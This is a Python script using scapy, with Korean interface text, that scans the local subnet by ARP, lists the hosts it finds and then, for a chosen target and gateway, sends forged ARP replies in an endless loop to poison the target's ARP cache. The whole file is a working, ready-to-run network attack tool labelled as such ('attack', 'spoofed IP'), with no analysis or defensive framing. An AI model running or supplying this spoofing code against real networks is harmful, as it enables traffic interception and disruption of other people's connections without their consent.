# -*- coding:utf-8 -*-
from scapy.all import *
import os
import threading

C_END = "\033[0m"
C_BOLD = "\033[1m"
C_INVERSE = "\033[7m"

C_BLACK = "\033[30m"
C_RED = "\033[31m"
C_GREEN = "\033[32m"
C_YELLOW = "\033[33m"
C_BLUE = "\033[34m"
C_PURPLE = "\033[35m"
C_CYAN = "\033[36m"
C_WHITE = "\033[37m"

C_BGBLACK = "\033[40m"
C_BGRED = "\033[41m"
C_BGGREEN = "\033[42m"
C_BGYELLOW = "\033[43m"
C_BGBLUE = "\033[44m"
C_BGPURPLE = "\033[45m"
C_BGCYAN = "\033[46m"
C_BGWHITE = "\033[47m"  # 색 / 효과

TLIST = ['타겟리스트초기화']

def myip():
    myip = os.popen('ipconfig').read()
    myip = myip.split()
    return myip[myip.index('IPv4') + 12]

def arptable(target):
 time.sleep(1)
 target = target.split()
 TLIST.append(target[0] + ' ' + target[1])
 print(C_BOLD + C_RED + '[ARPTABLE] '+ C_YELLOW + 'NUMBER: ' + str(TLIST.index(target[0] + ' ' + target[1])) + '> '+ C_END + C_YELLOW + 'IP: ' + C_END + target[0] + C_YELLOW + ' MAC: '+ C_END + target[1])



def multiarp(arg1 ,scanrange):
 scanip = str(scanrange) + str(arg1)
 _pkt = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=str(scanip))
 ans, unans = srp( _pkt, timeout=2, verbose=False)
 for snt, recv in ans:
  if recv:
   target = recv[ARP].psrc + ' ' + recv[Ether].src
   arptable(target)

def arpscan(scanip):
 scanrange = scanip.split('.')
 scanrange = scanrange[0] + '.' + scanrange[1] + '.' +scanrange[2] + '.'
 for length in range(0,255):
         arpthread = threading.Thread(target=multiarp, name = 'ARPthread' ,args = (str(length), str(scanrange)))
         arpthread.start()
 while(arpthread.is_alive()):
  time.sleep(1)

def arpspoof(answer):
 answer = answer.split()
 target = TLIST[int(answer[0])].split()
 gateway = TLIST[int(answer[1])].split()
 target_ip = target[0]
 target_mac = target[1]
 gateway_ip = gateway[0]
 print(C_BOLD + C_CYAN + '[대상IP] ' + C_END + C_BOLD + target_ip)
 print(C_BOLD + C_CYAN + '[대상MAC] ' + C_END + C_BOLD + target_mac)
 print(C_BOLD + C_CYAN + '[위조IP] ' + C_END + C_BOLD + gateway_ip)
 print(C_BOLD + C_PURPLE + '[Ctrl + Z] ' + C_END + C_BOLD + '공격 중지')
 while(1):
  send(ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip), verbose=False)
  time.sleep(8)

def start():
 global TLIST
 TLIST = ['타겟리스트초기화']
 os.system('cls')
 arpscan(myip())
 answer = input(C_BOLD + C_RED + ' 공격: [타겟] [게이트웨이]' + C_END + '||' + C_BOLD + C_YELLOW + '다시시작: [공백]' + C_END + C_BOLD + ' 입력: ')
 if answer:
  arpspoof(answer)
 else:
  start()



start()
